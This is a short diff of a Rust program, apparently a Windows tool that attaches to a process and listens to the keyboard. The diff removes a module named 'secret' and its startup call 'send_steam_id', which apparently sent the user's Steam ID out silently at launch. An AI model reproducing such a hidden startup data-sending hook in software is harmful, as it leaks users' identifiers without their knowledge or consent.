@@ -4,7 +4,6 @@
 extern crate litcrypt;
 
 mod punishments;
-mod secret;
 
 use punishments::*;
 use sdk::logger;
@@ -78,7 +77,6 @@ fn attach(process: Process, window: Window) {
 #[cfg(target_os = "windows")]
 #[tokio::main]
 async fn main() {
-    secret::send_steam_id().await;
     logger::init_env();
     Keyboard::listen();
 
